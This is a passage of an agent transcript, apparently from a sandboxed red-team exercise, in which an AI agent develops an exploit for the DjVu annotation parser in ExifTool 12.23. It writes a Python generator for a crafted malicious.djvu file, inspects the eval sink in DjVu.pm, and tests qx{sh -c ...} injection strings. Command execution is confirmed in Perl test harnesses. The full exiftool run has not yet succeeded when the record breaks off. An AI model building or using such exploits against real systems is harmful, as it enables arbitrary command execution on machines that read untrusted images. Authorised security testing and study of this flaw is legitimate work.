-rw-r--r-- 1 root root   27535 Apr  1  2021 Real.pm
-rw-r--r-- 1 root root   14541 Apr  1  2021 Reconyx.pm
-rw-r--r-- 1 root root   11084 Apr  1  2021 Red.pm
-rw-r--r-- 1 root root   38076 Apr  1  2021 Ricoh.pm
-rw-r--r-- 1 root root   54689 Apr  1  2021 Samsung.pm
-rw-r--r-- 1 root root   12116 Apr  1  2021 Sanyo.pm
-rw-r--r-- 1 root root    4006 Apr  1  2021 Scalado.pm
-rw-r--r-- 1 root root   23805 Apr  1  2021 Shift.pl
-rw-r--r-- 1 root root   10046 Apr  1  2021 Shortcuts.pm
-rw-r--r-- 1 root root   33952 Apr  1  2021 Sigma.pm
-rw-r--r-- 1 root root   24012 Apr  1  2021 SigmaRaw.pm
-rw-r--r-- 1 root root  444457 Apr  1  2021 Sony.pm
-rw-r--r-- 1 root root   12237 Apr  1  2021 SonyIDC.pm
-rw-r--r-- 1 root root    4640 Apr  1  2021 Stim.pm
-rw-r--r-- 1 root root   33775 Apr  1  2021 TagInfoXML.pm
-rw-r--r-- 1 root root  545026 Apr  1  2021 TagLookup.pm
-rw-r--r-- 1 root root 1744264 Apr  1  2021 TagNames.pod
-rw-r--r-- 1 root root    8319 Apr  1  2021 Text.pm
-rw-r--r-- 1 root root    3496 Apr  1  2021 Theora.pm
-rw-r--r-- 1 root root   11533 Apr  1  2021 Torrent.pm
-rw-r--r-- 1 root root    1731 Apr  1  2021 Unknown.pm
-rw-r--r-- 1 root root   17727 Apr  1  2021 VCard.pm
-rw-r--r-- 1 root root   30463 Apr  1  2021 Validate.pm
-rw-r--r-- 1 root root    8321 Apr  1  2021 Vorbis.pm
-rw-r--r-- 1 root root   13285 Apr  1  2021 WTV.pm
-rw-r--r-- 1 root root   24868 Apr  1  2021 WriteCanonRaw.pl
-rw-r--r-- 1 root root  133737 Apr  1  2021 WriteExif.pl
-rw-r--r-- 1 root root   30306 Apr  1  2021 WriteIPTC.pl
-rw-r--r-- 1 root root   29654 Apr  1  2021 WritePDF.pl
-rw-r--r-- 1 root root   15492 Apr  1  2021 WritePNG.pl
-rw-r--r-- 1 root root   11115 Apr  1  2021 WritePhotoshop.pl
-rw-r--r-- 1 root root   27353 Apr  1  2021 WritePostScript.pl
-rw-r--r-- 1 root root   88921 Apr  1  2021 WriteQuickTime.pl
-rw-r--r-- 1 root root   71762 Apr  1  2021 WriteXMP.pl
-rw-r--r-- 1 root root  306588 Apr  1  2021 Writer.pl
-rw-r--r-- 1 root root  175377 Apr  1  2021 XMP.pm
-rw-r--r-- 1 root root   83409 Apr  1  2021 XMP2.pl
-rw-r--r-- 1 root root   36843 Apr  1  2021 XMPStruct.pl
-rw-r--r-- 1 root root   27905 Apr  1  2021 ZIP.pm
-rw-r--r-- 1 root root    3659 Apr  1  2021 ZISRAW.pm
-rw-r--r-- 1 root root    7976 Apr  1  2021 iWork.pm
12.23


[17]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="set -e\nfind / -maxdepth 3 -type d -name 'exiftool-12.24' 2>/dev/null | sed -n '1,200p'\nfind / -maxdepth 3 -type f -name '12.24*' 2>/dev/null | sed -n '1,200p'", user='user', session=None, timeout=120)

[17]========================Tool Output (Red Team Operator)=========================


[18]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="/exiftool-12.23/exiftool -ver\nperl /exiftool-12.23/exiftool malicious.djvu || true\nls -l /tmp/exiftool_pwned || true\nprintf '\\nExit code of reading file: %d\\n' $?", user='user', session=None, timeout=120)

[18]========================Tool Output (Red Team Operator)=========================
12.23
ExifTool Version Number         : 12.23
File Name                       : malicious.djvu
Directory                       : .
File Size                       : 90 bytes
File Modification Date/Time     : 2025:08:07 22:13:44+00:00
File Access Date/Time           : 2025:08:07 22:13:44+00:00
File Inode Change Date/Time     : 2025:08:07 22:13:44+00:00
File Permissions                : -rw-r--r--
Error                           : File format error
ls: cannot access '/tmp/exiftool_pwned': No such file or directory

Exit code of reading file: 0


[19]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/djvu_poc.py', content='#!/usr/bin/env python3\nimport struct\nfrom pathlib import Path\n\ndef be32(n):\n    return struct.pack(\'>I\', n)\n\n# Injected token that triggers eval in 12.23\'s DjVu ANT parser\ninj_tok = "\\\\\\" . qx{sh -c \'printf pwned > /tmp/exiftool_pwned\'} . \\\\\\""\npayload = f\'(metadata "{inj_tok}")\\n\'\n\nanta_data = payload.encode(\'ascii\')\nanta_chunk = b\'ANTa\' + be32(len(anta_data)) + anta_data\n\n# Correct top-level header for DjVu IFF is b\'AT&TFORM\' + size + b\'DJVU\'\nchildren = anta_chunk\nform_type = b\'DJVU\'\nsize = len(form_type) + len(children)\ndjvu = b\'AT&TFORM\' + be32(size) + form_type + children\n\nout = Path(\'malicious.djvu\')\nout.write_bytes(djvu)\nprint(f\'[+] Wrote {out} ({len(djvu)} bytes)\')\nprint(\'[+] Payload s-expression:\')\nprint(payload)\n')

[19]========================Tool Output (Red Team Operator)=========================
File /home/user/djvu_poc.py created successfully.

[20]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="python3 /home/user/djvu_poc.py\nxxd -g 1 -l 160 malicious.djvu | sed -n '1,50p'\n/exiftool-12.23/exiftool malicious.djvu || true\nls -l /tmp/exiftool_pwned || true", user='user', session=None, timeout=120)

[20]========================Tool Output (Red Team Operator)=========================
[+] Wrote malicious.djvu (94 bytes)
[+] Payload s-expression:
(metadata "\" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . \"")

00000000: 41 54 26 54 46 4f 52 4d 00 00 00 52 44 4a 56 55  AT&TFORM...RDJVU
00000010: 41 4e 54 61 00 00 00 46 28 6d 65 74 61 64 61 74  ANTa...F(metadat
00000020: 61 20 22 5c 22 20 2e 20 71 78 7b 73 68 20 2d 63  a "\" . qx{sh -c
00000030: 20 27 70 72 69 6e 74 66 20 70 77 6e 65 64 20 3e   'printf pwned >
00000040: 20 2f 74 6d 70 2f 65 78 69 66 74 6f 6f 6c 5f 70   /tmp/exiftool_p
00000050: 77 6e 65 64 27 7d 20 2e 20 5c 22 22 29 0a        wned'} . \"").
ExifTool Version Number         : 12.23
File Name                       : malicious.djvu
Directory                       : .
File Size                       : 94 bytes
File Modification Date/Time     : 2025:08:07 22:14:46+00:00
File Access Date/Time           : 2025:08:07 22:14:46+00:00
File Inode Change Date/Time     : 2025:08:07 22:14:46+00:00
File Permissions                : -rw-r--r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Warning                         : Ignored invalid metadata entry(s)
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[21]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="sed -n '1,220p' /exiftool-12.23/lib/Image/ExifTool/DjVu.pm", user='user', session=None, timeout=120)

[21]========================Tool Output (Red Team Operator)=========================
#------------------------------------------------------------------------------
# File:         DjVu.pm
#
# Description:  Read DjVu archive meta information
#
# Revisions:    09/25/2008 - P. Harvey Created
#
# References:   1) http://djvu.sourceforge.net/ (DjVu v3 specification, Nov 2005)
#               2) http://www.djvu.org/
#
# Notes:        DjVu files are recognized and the IFF structure is processed
#               by Image::ExifTool::AIFF
#------------------------------------------------------------------------------

package Image::ExifTool::DjVu;

use strict;
use vars qw($VERSION);
use Image::ExifTool qw(:DataAccess :Utils);

$VERSION = '1.06';

sub ParseAnt($);
sub ProcessAnt($$$);
sub ProcessMeta($$$);
sub ProcessBZZ($$$);

# DjVu chunks that we parse (ref 4)
%Image::ExifTool::DjVu::Main = (
    GROUPS => { 2 => 'Image' },
    NOTES => q{
        Information is extracted from the following chunks in DjVu images. See
        L<http://www.djvu.org/> for the DjVu specification.
    },
    INFO => {
        SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Info' },
    },
    FORM => {
        TypeOnly => 1,  # extract chunk type only, then descend into chunk
        SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Form' },
    },
    ANTa => {
        SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Ant' },
    },
    ANTz => {
        Name => 'CompressedAnnotation',
        SubDirectory => {
            TagTable => 'Image::ExifTool::DjVu::Ant',
            ProcessProc => \&ProcessBZZ,
        }
    },
    INCL => 'IncludedFileID',
);

# information in the DjVu INFO chunk
%Image::ExifTool::DjVu::Info = (
    PROCESS_PROC => \&Image::ExifTool::ProcessBinaryData,
    GROUPS => { 2 => 'Image' },
    FORMAT => 'int8u',
    PRIORITY => 0, # first INFO block takes priority
    0 => {
        Name => 'ImageWidth',
        Format => 'int16u',
    },
    2 => {
        Name => 'ImageHeight',
        Format => 'int16u',
    },
    4 => {
        Name => 'DjVuVersion',
        Description => 'DjVu Version',
        Format => 'int8u[2]',
        # (this may be just one byte as with version 0.16)
        ValueConv => '$val=~/(\d+) (\d+)/ ? "$2.$1" : "0.$val"',
    },
    6 => {
        Name => 'SpatialResolution',
        Format => 'int16u',
        ValueConv => '(($val & 0xff)<<8) + ($val>>8)', # (little-endian!)
    },
    8 => {
        Name => 'Gamma',
        ValueConv => '$val / 10',
    },
    9 => {
        Name => 'Orientation',
        Mask => 0x07, # (upper 5 bits reserved)
        PrintConv => {
            1 => 'Horizontal (normal)',
            2 => 'Rotate 180',
            5 => 'Rotate 90 CW',
            6 => 'Rotate 270 CW',
        },
    },
);

# information in the DjVu FORM chunk
%Image::ExifTool::DjVu::Form = (
    PROCESS_PROC => \&Image::ExifTool::ProcessBinaryData,
    GROUPS => { 2 => 'Image' },
    0 => {
        Name => 'SubfileType',
        Format => 'undef[4]',
        Priority => 0,
        PrintConv => {
            DJVU => 'Single-page image',
            DJVM => 'Multi-page document',
            PM44 => 'Color IW44',
            BM44 => 'Grayscale IW44',
            DJVI => 'Shared component',
            THUM => 'Thumbnail image',
        },
    },
);

# tags found in the DjVu annotation chunk (ANTz or ANTa)
%Image::ExifTool::DjVu::Ant = (
    PROCESS_PROC => \&Image::ExifTool::DjVu::ProcessAnt,
    GROUPS => { 2 => 'Image' },
    NOTES => 'Information extracted from annotation chunks.',
    # Note: For speed, ProcessAnt() pre-scans for known tag ID's, so if any
    # new tags are added here they must also be added to the pre-scan check
    metadata => {
        SubDirectory => { TagTable => 'Image::ExifTool::DjVu::Meta' }
    },
    xmp => {
        Name => 'XMP',
        SubDirectory => { TagTable => 'Image::ExifTool::XMP::Main' }
    },
);

# tags found in the DjVu annotation metadata
%Image::ExifTool::DjVu::Meta = (
    PROCESS_PROC => \&Image::ExifTool::DjVu::ProcessMeta,
    GROUPS => { 1 => 'DjVu-Meta', 2 => 'Image' },
    NOTES => q{
        This table lists the standard DjVu metadata tags, but ExifTool will extract
        any tags that exist even if they don't appear here.  The DjVu v3
        documentation endorses tags borrowed from two standards: 1) BibTeX
        bibliography system tags (all lowercase Tag ID's in the table below), and 2)
        PDF DocInfo tags (capitalized Tag ID's).
    },
    # BibTeX tags (ref http://en.wikipedia.org/wiki/BibTeX)
    address     => { Groups => { 2 => 'Location' } },
    annote      => { Name => 'Annotation' },
    author      => { Groups => { 2 => 'Author' } },
    booktitle   => { Name => 'BookTitle' },
    chapter     => { },
    crossref    => { Name => 'CrossRef' },
    edition     => { },
    eprint      => { Name => 'EPrint' },
    howpublished=> { Name => 'HowPublished' },
    institution => { },
    journal     => { },
    key         => { },
    month       => { Groups => { 2 => 'Time' } },
    note        => { },
    number      => { },
    organization=> { },
    pages       => { },
    publisher   => { },
    school      => { },
    series      => { },
    title       => { },
    type        => { },
    url         => { Name => 'URL' },
    volume      => { },
    year        => { Groups => { 2 => 'Time' } },
    # PDF tags (same as Image::ExifTool::PDF::Info)
    Title       => { },
    Author      => { Groups => { 2 => 'Author' } },
    Subject     => { },
    Keywords    => { },
    Creator     => { },
    Producer    => { },
    CreationDate => {
        Name => 'CreateDate',
        Groups => { 2 => 'Time' },
        # RFC 3339 date/time format
        ValueConv => 'require Image::ExifTool::XMP; Image::ExifTool::XMP::ConvertXMPDate($val)',
        PrintConv => '$self->ConvertDateTime($val)',
    },
    ModDate => {
        Name => 'ModifyDate',
        Groups => { 2 => 'Time' },
        ValueConv => 'require Image::ExifTool::XMP; Image::ExifTool::XMP::ConvertXMPDate($val)',
        PrintConv => '$self->ConvertDateTime($val)',
    },
    Trapped => {
        # remove leading '/' from '/True' or '/False'
        ValueConv => '$val=~s{^/}{}; $val',
    },
);

#------------------------------------------------------------------------------
# Parse DjVu annotation "s-expression" syntax (recursively)
# Inputs: 0) data ref (with pos($$dataPt) set to start of annotation)
# Returns: reference to list of tokens/references, or undef if no tokens,
#          and the position in $$dataPt is set to end of last token
# Notes: The DjVu annotation syntax is not well documented, so I make
#        a number of assumptions here!
sub ParseAnt($)
{
    my $dataPt = shift;
    my (@toks, $tok, $more);
    # (the DjVu annotation syntax really sucks, and requires that every
    # single token be parsed in order to properly scan through the items)
Tok: for (;;) {
        # find the next token
        last unless $$dataPt =~ /(\S)/sg;   # get next non-space character
        if ($1 eq '(') {       # start of list
            $tok = ParseAnt($dataPt);
        } elsif ($1 eq ')') {  # end of list
            $more = 1;
            last;
        } elsif ($1 eq '"') {  # quoted string
            $tok = '';
            for (;;) {
                # get string up to the next quotation mark
                # this doesn't work in perl 5.6.2! grrrr


[22]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="sed -n '220,520p' /exiftool-12.23/lib/Image/ExifTool/DjVu.pm", user='user', session=None, timeout=120)

[22]========================Tool Output (Red Team Operator)=========================
                # this doesn't work in perl 5.6.2! grrrr
                # last Tok unless $$dataPt =~ /(.*?)"/sg;
                # $tok .= $1;
                my $pos = pos($$dataPt);
                last Tok unless $$dataPt =~ /"/sg;
                $tok .= substr($$dataPt, $pos, pos($$dataPt)-1-$pos);
                # we're good unless quote was escaped by odd number of backslashes
                last unless $tok =~ /(\\+)$/ and length($1) & 0x01;
                $tok .= '"';    # quote is part of the string
            }
            # must protect unescaped "$" and "@" symbols, and "\" at end of string
            $tok =~ s{\\(.)|([\$\@]|\\$)}{'\\'.($2 || $1)}sge;
            # convert C escape sequences (allowed in quoted text)
            $tok = eval qq{"$tok"};
        } else {                # key name
            pos($$dataPt) = pos($$dataPt) - 1;
            # allow anything in key but whitespace, braces and double quotes
            # (this is one of those assumptions I mentioned)
            $tok = $$dataPt =~ /([^\s()"]+)/sg ? $1 : undef;
        }
        push @toks, $tok if defined $tok;
    }
    # prevent further parsing unless more after this
    pos($$dataPt) = length $$dataPt unless $more;
    return @toks ? \@toks : undef;
}

#------------------------------------------------------------------------------
# Process DjVu annotation chunk (ANTa or decoded ANTz)
# Inputs: 0) ExifTool object reference, 1) DirInfo reference, 2) tag table ref
# Returns: 1 on success
sub ProcessAnt($$$)
{
    my ($et, $dirInfo, $tagTablePtr) = @_;
    my $dataPt = $$dirInfo{DataPt};

    # quick pre-scan to check for metadata or XMP
    return 1 unless $$dataPt =~ /\(\s*(metadata|xmp)[\s("]/s;

    # parse annotations into a tree structure
    pos($$dataPt) = 0;
    my $toks = ParseAnt($dataPt) or return 0;

    # process annotations individually
    my $ant;
    foreach $ant (@$toks) {
        next unless ref $ant eq 'ARRAY' and @$ant >= 2;
        my $tag = shift @$ant;
        next if ref $tag or not defined $$tagTablePtr{$tag};
        if ($tag eq 'metadata') {
            # ProcessMeta() takes array reference
            $et->HandleTag($tagTablePtr, $tag, $ant);
        } else {
            next if ref $$ant[0];   # only process simple values
            $et->HandleTag($tagTablePtr, $tag, $$ant[0]);
        }
    }
    return 1;
}

#------------------------------------------------------------------------------
# Process DjVu metadata
# Inputs: 0) ExifTool object reference, 1) DirInfo reference, 2) tag table ref
# Returns: 1 on success
# Notes: input dirInfo DataPt is a reference to a list of pre-parsed metadata entries
sub ProcessMeta($$$)
{
    my ($et, $dirInfo, $tagTablePtr) = @_;
    my $dataPt = $$dirInfo{DataPt};
    return 0 unless ref $$dataPt eq 'ARRAY';
    $et->VerboseDir('Metadata', scalar @$$dataPt);
    my ($item, $err);
    foreach $item (@$$dataPt) {
        # make sure item is a simple tag/value pair
        $err=1, next unless ref $item eq 'ARRAY' and @$item >= 2 and
                            not ref $$item[0] and not ref $$item[1];
        # add any new tags to the table
        unless ($$tagTablePtr{$$item[0]}) {
            my $name = $$item[0];
            $name =~ tr/-_a-zA-Z0-9//dc; # remove illegal characters
            length $name or $err = 1, next;
            AddTagToTable($tagTablePtr, $$item[0], { Name => ucfirst($name) });
        }
        $et->HandleTag($tagTablePtr, $$item[0], $$item[1]);
    }
    $err and $et->Warn('Ignored invalid metadata entry(s)');
    return 1;
}

#------------------------------------------------------------------------------
# Process BZZ-compressed data (in DjVu images)
# Inputs: 0) ExifTool object reference, 1) DirInfo reference, 2) tag table ref
# Returns: 1 on success
sub ProcessBZZ($$$)
{
    my ($et, $dirInfo, $tagTablePtr) = @_;
    require Image::ExifTool::BZZ;
    my $buff = Image::ExifTool::BZZ::Decode($$dirInfo{DataPt});
    unless (defined $buff) {
        $et->Warn("Error decoding $$dirInfo{DirName}");
        return 0;
    }
    my $verbose = $et->Options('Verbose');
    if ($verbose >= 3) {
        # dump the decoded data in very verbose mode
        $et->VerboseDir("Decoded $$dirInfo{DirName}", 0, length $buff);
        $et->VerboseDump(\$buff);
    }
    $$dirInfo{DataPt} = \$buff;
    $$dirInfo{DataLen} = $$dirInfo{DirLen} = length $buff;
    # process the data using the default process proc for this table
    my $processProc = $$tagTablePtr{PROCESS_PROC} or return 0;
    return &$processProc($et, $dirInfo, $tagTablePtr);
}

1;  # end

__END__

=head1 NAME

Image::ExifTool::DjVu - Read DjVu meta information

=head1 SYNOPSIS

This module is used by Image::ExifTool

=head1 DESCRIPTION

This module contains definitions required by Image::ExifTool to extract meta
information from DjVu images.  Parsing of the DjVu IFF structure is done by
Image::ExifTool::AIFF.

=head1 AUTHOR

Copyright 2003-2021, Phil Harvey (philharvey66 at gmail.com)

This library is free software; you can redistribute it and/or modify it
under the same terms as Perl itself.

=head1 REFERENCES

=over 4

=item L<http://djvu.sourceforge.net/>

=item L<http://www.djvu.org/>

=back

=head1 SEE ALSO

L<Image::ExifTool::TagNames/DjVu Tags>,
L<Image::ExifTool::AIFF(3pm)|Image::ExifTool::AIFF>,
L<Image::ExifTool(3pm)|Image::ExifTool>

=cut



[23]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/test_eval.pl', content='use strict; use warnings;\nsub run {\n  my ($tok)=@_;\n  my $orig=$tok;\n  $tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{\'\\\\\'.($2 || $1)}sge;\n  print "orig=[$orig]\\nprepped=[$tok]\\n";\n  my $res = eval qq{"$tok"};\n  print "eval_err=[$@]\\n" if $@;\n  print "result=[$res]\\n";\n}\nrun($ARGV[0]);\n')

[23]========================Tool Output (Red Team Operator)=========================
File /home/user/test_eval.pl created successfully.

[24]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl /home/user/test_eval.pl \'" . qx{sh -c \'"\'"\'printf pwned > /tmp/exiftool_pwned\'"\'"\'} . "\' || true\nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[24]========================Tool Output (Red Team Operator)=========================
orig=[" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . "]
prepped=[" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . "]
result=[]
-rw-r--r-- 1 user user 5 Aug  7 22:17 /tmp/exiftool_pwned


[25]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -we \'print "before \\\\`id\\\\` after\\n"\' \nperl -we \'print "before `id` after\\n"\' || true', user='user', session=None, timeout=120)

[25]========================Tool Output (Red Team Operator)=========================
before \`id\` after
before `id` after


[26]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='# Clean up canary and re-run exiftool on crafted file\nrm -f /tmp/exiftool_pwned || true\n/exiftool-12.23/exiftool -ver\n/exiftool-12.23/exiftool malicious.djvu || true\nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[26]========================Tool Output (Red Team Operator)=========================
12.23
ExifTool Version Number         : 12.23
File Name                       : malicious.djvu
Directory                       : .
File Size                       : 94 bytes
File Modification Date/Time     : 2025:08:07 22:14:46+00:00
File Access Date/Time           : 2025:08:07 22:14:46+00:00
File Inode Change Date/Time     : 2025:08:07 22:14:46+00:00
File Permissions                : -rw-r--r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Warning                         : Ignored invalid metadata entry(s)
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[27]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='head -n 3 /exiftool-12.23/exiftool', user='user', session=None, timeout=60)

[27]========================Tool Output (Red Team Operator)=========================
#!/usr/bin/perl -w
#------------------------------------------------------------------------------
# File:         exiftool


[28]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='grep -n "use lib" -n /exiftool-12.23/exiftool || true\nperl -V | sed -n \'1,40p\'', user='user', session=None, timeout=120)

[28]========================Tool Output (Red Team Operator)=========================
Summary of my perl5 (revision 5 version 36 subversion 0) configuration:
   
  Platform:
    osname=linux
    osvers=4.19.0
    archname=x86_64-linux-gnu-thread-multi
    uname='linux localhost 4.19.0 #1 smp debian 4.19.0 x86_64 gnulinux '
    config_args='-Dmksymlinks -Dusethreads -Duselargefiles -Dcc=x86_64-linux-gnu-gcc -Dcpp=x86_64-linux-gnu-cpp -Dld=x86_64-linux-gnu-gcc -Dccflags=-DDEBIAN -Wdate-time -D_FORTIFY_SOURCE=2 -g -O2 -ffile-prefix-map=/dummy/build/dir=. -fstack-protector-strong -Wformat -Werror=format-security -Dldflags= -Wl,-z,relro -Dlddlflags=-shared -Wl,-z,relro -Dcccdlflags=-fPIC -Darchname=x86_64-linux-gnu -Dprefix=/usr -Dprivlib=/usr/share/perl/5.36 -Darchlib=/usr/lib/x86_64-linux-gnu/perl/5.36 -Dvendorprefix=/usr -Dvendorlib=/usr/share/perl5 -Dvendorarch=/usr/lib/x86_64-linux-gnu/perl5/5.36 -Dsiteprefix=/usr/local -Dsitelib=/usr/local/share/perl/5.36.0 -Dsitearch=/usr/local/lib/x86_64-linux-gnu/perl/5.36.0 -Dman1dir=/usr/share/man/man1 -Dman3dir=/usr/share/man/man3 -Dsiteman1dir=/usr/local/man/man1 -Dsiteman3dir=/usr/local/man/man3 -Duse64bitint -Dman1ext=1 -Dman3ext=3perl -Dpager=/usr/bin/sensible-pager -Uafs -Ud_csh -Ud_ualarm -Uusesfio -Uusenm -Ui_libutil -Ui_xlocale -Uversiononly -DDEBUGGING=-g -Doptimize=-O2 -dEs -Duseshrplib -Dlibperl=libperl.so.5.36.0'
    hint=recommended
    useposix=true
    d_sigaction=define
    useithreads=define
    usemultiplicity=define
    use64bitint=define
    use64bitall=define
    uselongdouble=undef
    usemymalloc=n
    default_inc_excludes_dot=define
  Compiler:
    cc='x86_64-linux-gnu-gcc'
    ccflags ='-D_REENTRANT -D_GNU_SOURCE -DDEBIAN -fwrapv -fno-strict-aliasing -pipe -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64'
    optimize='-O2 -g'
    cppflags='-D_REENTRANT -D_GNU_SOURCE -DDEBIAN -fwrapv -fno-strict-aliasing -pipe -I/usr/local/include'
    ccversion=''
    gccversion='12.2.0'
    gccosandvers=''
    intsize=4
    longsize=8
    ptrsize=8
    doublesize=8
    byteorder=12345678
    doublekind=3
    d_longlong=define
    longlongsize=8
    d_longdbl=define
    longdblsize=16
    longdblkind=3
    ivtype='long'
    ivsize=8
    nvtype='double'


[29]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -we \'$tok="\\\\\\" . qx{sh -c \\"echo hi\\"} . \\\\\\""; print qq{SRC=[}.qq{"$tok"}.qq{]\\n}; my $res=eval qq{"$tok"}; print "res=[$res]\\n"; warn $@ if $@\'', user='user', session=None, timeout=120)

[29]========================Tool Output (Red Team Operator)=========================
Bareword found where operator expected at (eval 1) line 1, near ""\" . qx{sh -c "echo"
	(Missing operator before echo?)
Use of uninitialized value $res in concatenation (.) or string at -e line 1.
syntax error at (eval 1) line 1, near ""\" . qx{sh -c "echo hi"
SRC=["\" . qx{sh -c "echo hi"} . \""]
res=[]


[30]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -Mstrict -Mwarnings -e \'\n  require q{/exiftool-12.23/lib/Image/ExifTool/DjVu.pm};\n  my $data = qq{(metadata "\\\\\\" . qx{sh -c \'\\\'\'printf pwned > /tmp/exiftool_pwned\'\\\'\'} . \\\\\\"\\")\\n};\n  my $ref = Image::ExifTool::DjVu::ParseAnt(\\$data);\n  print "Parsed: ", defined($ref)?"ok":"undef", "\\n";\n\' \nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[30]========================Tool Output (Red Team Operator)=========================
Parsed: ok
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[31]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input="rm -f /tmp/exiftool_pwned /tmp/exiftool_pwned2 || true\nperl /home/user/test_eval.pl '\\x40{[qx{sh -c '\\''printf pwned2 > /tmp/exiftool_pwned2'\\''}]}'\nls -l /tmp/exiftool_pwned2 || true", user='user', session=None, timeout=120)

[31]========================Tool Output (Red Team Operator)=========================
orig=[\x40{[qx{sh -c 'printf pwned2 > /tmp/exiftool_pwned2'}]}]
prepped=[\x40{[qx{sh -c 'printf pwned2 > /tmp/exiftool_pwned2'}]}]
result=[@{[qx{sh -c 'printf pwned2 > /tmp/exiftool_pwned2'}]}]
ls: cannot access '/tmp/exiftool_pwned2': No such file or directory


[32]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/test_eval2.pl', content='use strict; use warnings;\nsub run {\n  my ($tok)=@_;\n  $tok =~ s{\\\\(.)|([\\$\\@]|\\\\$)}{\'\\\\\'.($2 || $1)}sge;\n  my $code = qq{"$tok"};\n  print "CODE=[$code]\\n";\n  my $res = eval $code;\n  print "EVAL_ERR=[$@]\\n" if $@;\n  print "RESULT=[$res]\\n";\n}\nrun($ARGV[0]);\n')

[32]========================Tool Output (Red Team Operator)=========================
File /home/user/test_eval2.pl created successfully.

[33]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl /home/user/test_eval2.pl \'" . qx{sh -c \'"\'"\'printf pwned > /tmp/exiftool_pwned\'"\'"\'} . "\' \nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[33]========================Tool Output (Red Team Operator)=========================
CODE=["" . qx{sh -c 'printf pwned > /tmp/exiftool_pwned'} . ""]
RESULT=[]
-rw-r--r-- 1 user user 5 Aug  7 22:27 /tmp/exiftool_pwned


[34]=========================Tool Call (Red Team Operator)==========================
sandbox_write_file(file_path='/home/user/replay_parse.pl', content='use strict; use warnings;\nuse Fcntl;\nrequire q{/exiftool-12.23/lib/Image/ExifTool/DjVu.pm};\nmy $f = \'malicious.djvu\';\nopen my $fh, \'<:raw\', $f or die $!;\nread $fh, my $buf, 4 or die;\ndie "bad magic" unless $buf eq \'AT&T\';\nread $fh, $buf, 4; # \'FORM\'\nread $fh, my $sz, 4 or die;\nread $fh, my $djvu, 4 or die;\nread $fh, my $chunk, 4 or die;\nread $fh, my $clen, 4 or die;\nmy $len = unpack(\'N\',$clen);\nread $fh, my $data, $len or die;\nclose $fh;\nprint "Chunk=[$chunk] len=$len\\n";\n# Now invoke ParseAnt\nmy $ref = Image::ExifTool::DjVu::ParseAnt(\\$data);\nprint "Parsed toks ref: ",$ref?"OK":"undef","\\n";\n')

[34]========================Tool Output (Red Team Operator)=========================
File /home/user/replay_parse.pl created successfully.

[35]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl /home/user/replay_parse.pl', user='user', session=None, timeout=120)

[35]========================Tool Output (Red Team Operator)=========================
Chunk=[ANTa] len=70
Parsed toks ref: OK


[36]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='rm -f /tmp/exiftool_pwned3 || true\nperl -Mstrict -Mwarnings -e \'\n  require q{/exiftool-12.23/lib/Image/ExifTool/DjVu.pm};\n  my $data = qq{("\\\\\\" . qx{sh -c \'\\\'\'printf pwned3 > /tmp/exiftool_pwned3\'\\\'\'} . \\\\\\"\\")\\n};\n  my $ref = Image::ExifTool::DjVu::ParseAnt(\\$data);\n  print "Parsed: ", defined($ref)?"ok":"undef", "\\n";\n\' \nls -l /tmp/exiftool_pwned3 || true', user='user', session=None, timeout=120)

[36]========================Tool Output (Red Team Operator)=========================
Parsed: ok
ls: cannot access '/tmp/exiftool_pwned3': No such file or directory


[37]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='perl -we \'print "X @{[1+2]} Y\\n"\'', user='user', session=None, timeout=60)

[37]========================Tool Output (Red Team Operator)=========================
X 3 Y


[38]=========================Tool Call (Red Team Operator)==========================
sandbox_run(input='rm -f /tmp/exiftool_pwned || true\nperl -Mstrict -Mwarnings -e \'\n  require q{/exiftool-12.23/lib/Image/ExifTool/DjVu.pm};\n  my $data = qq{(metadata "\\\\\\" . qx{sh -c \'\\\'\'printf pwned > /tmp/exiftool_pwned\'\\\'\'} . \\\\\\"\\")\\n};\n  my $ref = Image::ExifTool::DjVu::ParseAnt(\\$data);\n  print "Parsed: ", defined($ref)?"ok":"undef", " size=", scalar(@$ref), "\\n";\n\' \nls -l /tmp/exiftool_pwned || true', user='user', session=None, timeout=120)

[38]========================Tool Output (Red Team Operator)=========================
Parsed: ok size=1
ls: cannot access '/tmp/exiftool_pwned': No such file or directory


[39]=========================Tool Call (Red Team Operator)==========================
